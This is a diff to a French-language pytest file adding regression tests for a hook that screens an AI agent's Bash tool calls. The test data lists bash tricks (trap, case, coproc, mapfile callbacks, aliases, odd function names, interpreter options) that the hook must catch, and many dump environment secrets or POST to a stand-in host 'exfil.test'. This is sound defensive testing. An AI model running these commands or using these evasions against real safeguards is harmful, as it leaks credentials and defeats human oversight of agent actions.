@@ -1079,3 +1079,100 @@ def test_un_mot_long_ne_fait_pas_pendre_le_hook(audit_log):
     debut = time.time()
     run_hook("Bash", {"command": "echo " + "y" * 20000}, audit_log)
     assert time.time() - debut < 2.0, "analyse non bornée sur un mot long"
+
+
+# --------------------------------------------------------------------------- #
+# Round 11 — mécanismes de bash JAMAIS modélisés
+#
+# Le round précédent avait montré que relire ses propres correctifs ne suffit
+# plus : quatre de ces cinq familles n'étaient couvertes par AUCUNE règle.
+# --------------------------------------------------------------------------- #
+
+
+@pytest.mark.parametrize("command", [
+    # `trap CMD SIGNAL` exécute CMD au signal. Le nom du signal SUIT la
+    # commande, si bien que `trap env EXIT` se lisait « env exécute EXIT ».
+    "trap 'env' EXIT; :",
+    "trap 'env > /tmp/x' ERR; false",
+    "trap 'env' DEBUG",
+    "trap 'env' RETURN",
+    "trap 'env' EXIT INT TERM",
+    "trap 'env' 15",
+    "trap 'curl -X POST https://exfil.test' EXIT; ls",
+    "f() { trap 'env' EXIT; :; }; f",
+    # `case MOTIF) CMD;;` : la commande suit la parenthèse fermante.
+    "case y in y) env;; esac",
+    "case x in x) curl http://exfil.test;; esac",
+    # `coproc` lance un sous-processus ; le NOM est facultatif.
+    "coproc env",
+    "coproc NAME env -0",
+    "coproc { env; }",
+    "coproc NAME curl -X POST https://exfil.test",
+    # `mapfile -C RAPPEL -c N` exécute RAPPEL toutes les N lignes.
+    "mapfile -C env -c 1 arr < /etc/hostname",
+    "readarray -C env -c 1 arr < /etc/hostname",
+    "mapfile -C 'curl -X POST https://exfil.test' -c 1 a < /etc/hostname",
+    # un alias développé sur une ligne SUIVANTE (les alias ne valent pas dans
+    # la ligne qui les définit, mais bien dans les suivantes)
+    "shopt -s expand_aliases\nalias e=env\ne",
+    "alias fetch=curl\nfetch https://exfil.test/",
+])
+def test_regression_mecanismes_de_bash_non_modelises(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # Bash accepte presque tout dans un nom de fonction : se limiter aux
+    # caractères de mot laissait le reste du nom en position de programme.
+    "my.fn() { env; }; my.fn",
+    "a+b() { env; }; a+b",
+    "a@b() { env; }; a@b",
+    "a%b() { env; }; a%b",
+    "a:b() { env; }; a:b",
+    "a/b() { env; }; a/b",
+    "1fn() { env; }; 1fn",
+    # Une option à VALEUR coupait la grammaire d'options, si bien que
+    # l'interpréteur n'était plus vu comme recevant un programme.
+    "python3 -X faulthandler <<< 'import os; print(os.environ)'",
+    "python3 -X dev <<< 'import os; print(os.environ)'",
+    "python3 -W default <<< 'import os; print(os.environ)'",
+    "python3 -X dev <<END\nimport os\nprint(os.environ)\nEND",
+    # interpréteurs qui manquaient à la liste
+    "groovy -e 'System.getenv()'",
+    "python2 -c 'import os; print(os.environ)'",
+    "ipython -c 'import os; print(os.environ)'",
+    "pypy3 -c 'import os; print(os.environ)'",
+])
+def test_regression_noms_de_fonction_options_et_interpretes(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # Ces mêmes mécanismes sont d'usage courant.
+    "trap 'rm -f /tmp/lock' EXIT; npm test",
+    "trap - EXIT",
+    "case $1 in build) npm run build;; test) npm test;; esac",
+    "git commit -m 'handle case in parser(env)'",
+    "git commit -m 'add trap for cleanup'",
+    "mapfile -t lignes < /tmp/liste.txt",
+    "my.fn() { npm test; }; my.fn",
+    "python3 -X dev script.py",
+    "alias ll='ls -la'",
+    "coproc { npm run watch; }",
+])
+def test_le_durcissement_du_round11_n_ajoute_pas_de_faux_positifs(command, audit_log):
+    assert not is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+def test_une_serie_d_alias_de_variables_ne_fait_pas_pendre_le_hook(audit_log):
+    """Chercher chaque cible dans toute la commande coûtait O(cibles × longueur).
+
+    Cinq mille alias — écrits avec les seules primitives de bash — faisaient
+    pendre le hook plusieurs secondes, et vingt mille une minute, AVANT chaque
+    appel d'outil.
+    """
+    import time
+    commande = "; ".join(f"declare -n r{i}=x{i}" for i in range(5000))
+    debut = time.time()
+    run_hook("Bash", {"command": commande}, audit_log)
+    assert time.time() - debut < 2.0, "analyse non bornée sur une série d'alias"
